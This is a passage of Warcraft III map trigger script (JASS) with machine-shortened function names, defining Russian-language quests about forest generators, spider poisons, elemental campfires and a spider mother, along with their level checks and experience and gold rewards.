call TriggerAddCondition(Yr,Condition(function BD2))
call TriggerAddAction(Yr,function BD9)
endfunction
function BEC takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$48616D67) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BED takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BEE takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BEF takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BEG takes nothing returns boolean
return GetBooleanAnd(BEE(),BEF())
endfunction
function BEH takes nothing returns boolean
return GetBooleanAnd(BED(),BEG())
endfunction
function BEI takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=1) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=5) then
return false
endif
return true
endfunction
function BEJ takes nothing returns nothing
if BEI() then
call AddHeroXP(GetEnumUnit(),450,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+450
else
endif
endfunction
function BEK takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=2) then
return false
endif
return true
endfunction
function BEL takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[4])
call QuestSetCompletedBJ(YX[4],true)
call DestroyQuest(YX[4])
set YV[23]=GetRectCenter(T)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF7F00Генераторы:|r 5/5
Молодцы! Награда не заставит себя ждать.")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BEH))
call ForGroupBJ(Th,function BEJ)
call DestroyGroup(Th)
set Sf=Sf+1
call RemoveLocation(YV[23])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF450 опыта|r, |c00ffff0070 золота|r, |c00ff96962 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BEK() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+210
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+6
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BEM takes nothing returns nothing
set Ys=CreateTrigger()
call DisableTrigger(Ys)
call TriggerRegisterAnyUnitEventBJ(Ys,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Ys,Condition(function BEC))
call TriggerAddAction(Ys,function BEL)
endfunction
function BEN takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E73716F) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BEO takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=11) then
return false
endif
return true
endfunction
function BEP takes nothing returns nothing
if BEO() then
call DestroyEffectBJ(Us[5])
call AddSpecialEffectTargetUnitBJ("overhead",KI,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[5]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Великая опасность\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 11-18|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Великая опасность","|c006969FFУровень задания: 11-18|r
Наш Лес погибает... За каждым кустом прячется злобный монстр, под каждым камнем враги. Виной всему Разрушитель Природы, который поработил всех существ Леса и предварительно торавляет моральных дух его жителей. Что делать, думаю не нужно обьяснять.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[5]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000011|r уровня",.027,255,255,255)
endif
endfunction
function BEQ takes nothing returns nothing
set Yt=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Yt,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yt,Condition(function BEN))
call TriggerAddAction(Yt,function BEP)
endfunction
function BER takes nothing returns nothing
call DestroyEffectBJ(Us[5])
call EnableTrigger(Yv)
call AddSpecialEffectTargetUnitBJ("overhead",KI,"war3mapImported\\QuestYellow1.mdx")
set Us[5]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Вы отомстили за Лес!|r")
call DisableTrigger(Yt)
endfunction
function BES takes nothing returns nothing
set Yu=CreateTrigger()
call TriggerRegisterUnitEvent(Yu,K1,EVENT_UNIT_DEATH)
call TriggerAddAction(Yu,function BER)
endfunction
function BET takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E73716F) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BEU takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BEV takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BEW takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BEX takes nothing returns boolean
return GetBooleanAnd(BEV(),BEW())
endfunction
function BEY takes nothing returns boolean
return GetBooleanAnd(BEU(),BEX())
endfunction
function BEZ takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=11) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=18) then
return false
endif
return true
endfunction
function BEa takes nothing returns nothing
if BEZ() then
call AddHeroXP(GetEnumUnit(),2000,false)
else
endif
endfunction
function BEb takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=11) then
return false
endif
return true
endfunction
function BEc takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=11) then
return false
endif
return true
endfunction
function BEd takes nothing returns nothing
if BEc() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[5])
call QuestSetCompletedBJ(YX[5],true)
call DestroyQuest(YX[5])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BEY))
call ForGroupBJ(Th,function BEa)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF2000 опыта|r, |c00ffff00200 золота|r, |c00ff96965 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BEb() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+600
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+15
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000011|r уровня",.027,255,255,255)
endif
endfunction
function BEe takes nothing returns nothing
set Yv=CreateTrigger()
call DisableTrigger(Yv)
call TriggerRegisterAnyUnitEventBJ(Yv,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yv,Condition(function BET))
call TriggerAddAction(Yv,function BEd)
endfunction
function BEf takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$686D696C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BEg takes nothing returns nothing
call DestroyEffectBJ(Us[7])
call AddSpecialEffectTargetUnitBJ("overhead",Id,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[7]=GetLastCreatedEffectBJ()
call EnableTrigger(Yx)
call EnableTrigger(Yy)
call EnableTrigger(Yz)
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Яд во благо\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 13-18|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Яд во благо","Соберите с пауков |c0000FF00по одному виду их яда|r, а потом приходите ко мне
|c006969FFУровень задания: 13-18|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[7]=GetLastCreatedQuestBJ()
endfunction
function BEh takes nothing returns nothing
set Yw=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Yw,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Yw,Condition(function BEf))
call TriggerAddAction(Yw,function BEg)
endfunction
function BEi takes nothing returns boolean
if not (GetUnitTypeId(GetDyingUnit())==$6E303044) then
return false
endif
return true
endfunction
function BEj takes nothing returns boolean
if not (QP[0]==1) then
return false
endif
return true
endfunction
function BEk takes nothing returns nothing
set QP[0]=GetRandomInt(1,8)
if BEj() then
call DisableTrigger(GetTriggeringTrigger())
set Y0[0]=GetUnitLoc(GetDyingUnit())
call CreateItemLoc($4930304E,Y0[0])
call RemoveLocation(Y0[0])
else
call DoNothing()
endif
endfunction
function BEl takes nothing returns nothing
set Yx=CreateTrigger()
call DisableTrigger(Yx)
call TriggerRegisterAnyUnitEventBJ(Yx,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Yx,Condition(function BEi))
call TriggerAddAction(Yx,function BEk)
endfunction
function BEm takes nothing returns boolean
if not (GetUnitTypeId(GetDyingUnit())==$6E303045) then
return false
endif
return true
endfunction
function BEn takes nothing returns boolean
if not (QP[1]==1) then
return false
endif
return true
endfunction
function BEo takes nothing returns nothing
set QP[1]=GetRandomInt(1,8)
set Y0[1]=GetUnitLoc(GetDyingUnit())
if BEn() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($4930304D,Y0[1])
else
call DoNothing()
endif
call RemoveLocation(Y0[1])
endfunction
function BEp takes nothing returns nothing
set Yz=CreateTrigger()
call DisableTrigger(Yz)
call TriggerRegisterAnyUnitEventBJ(Yz,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Yz,Condition(function BEm))
call TriggerAddAction(Yz,function BEo)
endfunction
function BEq takes nothing returns boolean
if not (GetUnitTypeId(GetDyingUnit())==$6E303046) then
return false
endif
return true
endfunction
function BEr takes nothing returns boolean
if not (QP[2]==1) then
return false
endif
return true
endfunction
function BEs takes nothing returns nothing
set QP[2]=GetRandomInt(1,8)
set Y0[2]=GetUnitLoc(GetDyingUnit())
if BEr() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($4930304F,Y0[2])
else
call DoNothing()
endif
call RemoveLocation(Y0[2])
endfunction
function BEt takes nothing returns nothing
set Yy=CreateTrigger()
call DisableTrigger(Yy)
call TriggerRegisterAnyUnitEventBJ(Yy,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Yy,Condition(function BEq))
call TriggerAddAction(Yy,function BEs)
endfunction
function BEu takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$4930304D then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930304F then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930304E then
return true
endif
return false
endfunction
function BEv takes nothing returns boolean
if not BEu() then
return false
endif
return true
endfunction
function BEw takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING," |c0000FF00Яды:|r 1/3")
call TriggerSleepAction(.2)
call EnableTrigger(Y2)
endfunction
function BEx takes nothing returns nothing
set Y1=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Y1,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Y1,Condition(function BEv))
call TriggerAddAction(Y1,function BEw)
endfunction
function BEy takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$4930304D then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930304F then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930304E then
return true
endif
return false
endfunction
function BEz takes nothing returns boolean
if not BEy() then
return false
endif
return true
endfunction
function BE0 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING," |c0000FF00Яды:|r 2/3")
call TriggerSleepAction(.2)
call EnableTrigger(Y3)
endfunction
function BE1 takes nothing returns nothing
set Y2=CreateTrigger()
call DisableTrigger(Y2)
call TriggerRegisterAnyUnitEventBJ(Y2,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Y2,Condition(function BEz))
call TriggerAddAction(Y2,function BE0)
endfunction
function BE2 takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$4930304D then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930304F then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930304E then
return true
endif
return false
endfunction
function BE3 takes nothing returns boolean
if not BE2() then
return false
endif
return true
endfunction
function BE4 takes nothing returns nothing
call DestroyEffect(Us[7])
call EnableTrigger(Y4)
call DisableTrigger(GetTriggeringTrigger())
call AddSpecialEffectTargetUnitBJ("overhead",Id,"war3mapImported\\QuestYellow1.mdx")
set Us[7]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING," |c0000FF00Яды:|r 3/3
Вернитесь за наградой!")
endfunction
function BE5 takes nothing returns nothing
set Y3=CreateTrigger()
call DisableTrigger(Y3)
call TriggerRegisterAnyUnitEventBJ(Y3,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Y3,Condition(function BE3))
call TriggerAddAction(Y3,function BE4)
endfunction
function BE6 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$686D696C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BE7 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BE8 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BE9 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BFB takes nothing returns boolean
return GetBooleanAnd(BE8(),BE9())
endfunction
function BFC takes nothing returns boolean
return GetBooleanAnd(BE7(),BFB())
endfunction
function BFD takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=13) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=18) then
return false
endif
return true
endfunction
function BFE takes nothing returns nothing
if BFD() then
call AddHeroXP(GetEnumUnit(),1000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1000
else
endif
endfunction
function BFF takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=13) then
return false
endif
return true
endfunction
function BFG takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[7])
call QuestSetCompletedBJ(YX[7],true)
call DestroyQuest(YX[7])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BFC))
call ForGroupBJ(Th,function BFE)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1000 опыта|r, |c00ffff00150 золота|r, |c00ff96964 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BFF() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+450
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+12
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BFH takes nothing returns nothing
set Y4=CreateTrigger()
call DisableTrigger(Y4)
call TriggerRegisterAnyUnitEventBJ(Y4,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Y4,Condition(function BE6))
call TriggerAddAction(Y4,function BFG)
endfunction
function BFI takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E6D726D) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BFJ takes nothing returns nothing
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[8])
call AddSpecialEffectTargetUnitBJ("overhead",Ia,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[8]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Y6)
set YV[24]=GetUnitLoc(GetTriggerUnit())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Частички Зла\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 13-20|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Частички Зла","Пауки никогда не любили огонь. И вот неожиданно в лесу появляется 4 костра, каждый из которых под охраной Элементаля. Обезвредьте все костры, молю Вас!
|c006969FFУровень задания: 13-20|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[8]=GetLastCreatedQuestBJ()
call RemoveLocation(YV[24])
call ShowUnitShow(La)
call PauseUnitBJ(false,La)
call ShowUnitShow(Lb)
call PauseUnitBJ(false,Lb)
call ShowUnitShow(Le)
call PauseUnitBJ(false,Le)
call ShowUnitShow(Lc)
call PauseUnitBJ(false,Lc)
endfunction
function BFK takes nothing returns nothing
set Y5=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Y5,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Y5,Condition(function BFI))
call TriggerAddAction(Y5,function BFJ)
endfunction
function BFL takes nothing returns boolean
if not (GetDyingUnit()==La) then
return false
endif
return true
endfunction
function BFM takes nothing returns boolean
if not (GetDyingUnit()==Lb) then
return false
endif
return true
endfunction
function BFN takes nothing returns boolean
if not (GetDyingUnit()==Le) then
return false
endif
return true
endfunction
function BFO takes nothing returns boolean
if not (GetDyingUnit()==Lc) then
return false
endif
return true
endfunction
function BFP takes nothing returns boolean
if not (IsUnitDeadBJ(La)==true) then
return false
endif
if not (IsUnitDeadBJ(Lb)==true) then
return false
endif
if not (IsUnitDeadBJ(Lc)==true) then
return false
endif
if not (IsUnitDeadBJ(Le)==true) then
return false
endif
return true
endfunction
function BFQ takes nothing returns nothing
set YV[25]=GetUnitLoc(GetTriggerUnit())
if BFL() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFСущность Огня |c00ff0000мертва")
call CreateItemLoc($49303650,YV[25])
else
endif
if BFM() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFСущность Льда |c00ff0000мертва")
call CreateItemLoc($49303651,YV[25])
else
endif
if BFN() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFСущность Природы |c00ff0000мертва")
call CreateItemLoc($49303652,YV[25])
else
endif
if BFO() then
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFСущность Тьмы |c00ff0000мертва")
call CreateItemLoc($49303653,YV[25])
else
endif
call RemoveLocation(YV[25])
if BFP() then
call DestroyEffectBJ(Us[8])
call AddSpecialEffectTargetUnitBJ("overhead",Ia,"war3mapImported\\QuestYellow1.mdx")
set Us[8]=GetLastCreatedEffectBJ()
call EnableTrigger(Y7)
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFВсе сущности убиты. Вернитесь за наградой.")
else
endif
endfunction
function BFR takes nothing returns nothing
set Y6=CreateTrigger()
call DisableTrigger(Y6)
call TriggerRegisterAnyUnitEventBJ(Y6,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(Y6,function BFQ)
endfunction
function BFS takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E6D726D) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BFT takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BFU takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BFV takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BFW takes nothing returns boolean
return GetBooleanAnd(BFU(),BFV())
endfunction
function BFX takes nothing returns boolean
return GetBooleanAnd(BFT(),BFW())
endfunction
function BFY takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=13) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=20) then
return false
endif
return true
endfunction
function BFZ takes nothing returns nothing
if BFY() then
call AddHeroXP(GetEnumUnit(),1100,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1100
else
endif
endfunction
function BFa takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=13) then
return false
endif
return true
endfunction
function BFb takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[8])
call QuestSetCompletedBJ(YX[8],true)
call DestroyQuest(YX[8])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BFX))
call ForGroupBJ(Th,function BFZ)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1100 опыта|r, |c00ffff00200 золота|r, |c00ff96965 Кровавые Метки")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BFa() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+600
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+15
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BFc takes nothing returns nothing
set Y7=CreateTrigger()
call DisableTrigger(Y7)
call TriggerRegisterAnyUnitEventBJ(Y7,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Y7,Condition(function BFS))
call TriggerAddAction(Y7,function BFb)
endfunction
function BFd takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E647470) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BFe takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=16) then
return false
endif
return true
endfunction
function BFf takes nothing returns nothing
if BFe() then
call DestroyEffectBJ(Us[9])
call AddSpecialEffectTargetUnitBJ("overhead",Ig,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[9]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Ядовитая опасность\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 16-22|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Ядовитая опасность","|c006969FFУровень задания: 16-22|r
Видели этот участок Леса? Везде пауки, будь они неладны! И их всё больше и больше!!! Да-да! Так вот, единственный способ перестать им плодиться дальше - убить их мамочку, что скрывается в пещере недалеко отсюда","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[9]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000016|r уровня",.027,255,255,255)
endif
endfunction
function BFg takes nothing returns nothing
set Y8=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Y8,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Y8,Condition(function BFd))
call TriggerAddAction(Y8,function BFf)
endfunction
function BFh takes nothing returns nothing
call DestroyEffectBJ(Us[9])
call EnableTrigger(ZB)
call AddSpecialEffectTargetUnitBJ("overhead",Ig,"war3mapImported\\QuestYellow1.mdx")
set Us[9]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Мать пауков гниет в своей пещере. Миссия выполнена!!!|r")
call DisableTrigger(Y8)
endfunction
function BFi takes nothing returns nothing
set Y9=CreateTrigger()
call TriggerRegisterUnitEvent(Y9,Kv,EVENT_UNIT_DEATH)
call TriggerAddAction(Y9,function BFh)
endfunction
function BFj takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E647470) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BFk takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BFl takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BFm takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BFn takes nothing returns boolean
return GetBooleanAnd(BFl(),BFm())
endfunction
function BFo takes nothing returns boolean
return GetBooleanAnd(BFk(),BFn())
endfunction
function BFp takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=16) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=22) then
return false
endif
return true
endfunction
function BFq takes nothing returns nothing
if BFp() then
call AddHeroXP(GetEnumUnit(),3000,false)
else
endif
endfunction
function BFr takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=16) then
return false
endif
return true
endfunction
function BFs takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=16) then
return false
endif
return true
endfunction
function BFt takes nothing returns nothing
if BFs() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[9])
call QuestSetCompletedBJ(YX[9],true)
call DestroyQuest(YX[9])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BFo))
call ForGroupBJ(Th,function BFq)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3000 опыта|r, |c00ffff00250 золота|r, |c00ff96968 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BFr() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+750
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+24
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000016|r уровня",.027,255,255,255)
endif
endfunction
function BFu takes nothing returns nothing
set ZB=CreateTrigger()
call DisableTrigger(ZB)
call TriggerRegisterAnyUnitEventBJ(ZB,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZB,Condition(function BFj))
call TriggerAddAction(ZB,function BFt)
endfunction
function BFv takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E62656C) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BFw takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=19) then
return false
endif
return true
endfunction
function BFx takes nothing returns nothing
if BFw() then
call DestroyEffectBJ(Us[10])
